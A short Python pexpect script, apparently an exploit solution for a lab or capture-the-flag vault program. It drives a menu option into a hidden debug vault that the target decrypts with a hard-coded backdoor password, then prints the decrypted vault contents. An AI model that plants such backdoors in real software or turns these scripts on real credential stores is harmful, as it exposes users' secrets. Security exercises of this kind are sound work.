import os
import sys
import pexpect

def main(execname):

    process = pexpect.spawn(execname, [], timeout=5, echo=False)

    # process.logfile = sys.stdout.buffer
    
    process.expect_exact("Choice:")
    process.sendline("3")
    process.expect("No vault loaded. Enter vault filename to debug-dump:")
    process.sendline("new")
#     process.expect_exact("""[*] Found hidden debug vault: new_debug.csv
# [*] Decrypting using hard-coded backdoor password.
# WARNING: This will print *decrypted* vault contents to the screen (unsafe).
# Are you sure you want to continue? (y/n):""")
    # process.expect_exact("b'print *decrypted* vault contents to the screen (unsafe).\r\nAre you sure you want to continue? (y/n):")
    process.expect_exact("""[*] Found hidden debug vault: new_debug.csv\r
[*] Decrypting using hard-coded backdoor password.\r
WARNING: This will print *decrypted* vault contents to the screen (unsafe).\r
Are you sure you want to continue? (y/n):""")
    process.sendline("y")
    # process.expect_exact("Are you sure you want to continue? (y/n):")
    # process.sendline("y")
    process.expect_exact("=== DEBUG DUMP (Decrypted Vault Contents) ===")
    process.expect_exact("=== END OF DUMP ===")
    contents = process.before.decode("ascii").strip()
    print(contents)

if __name__ == "__main__":
    # main(sys.argv[1])
    try:
        main("python3 main.py")
    except Exception as e:  # pylint: disable=broad-except
        print("Exploit failed.")
        raise
        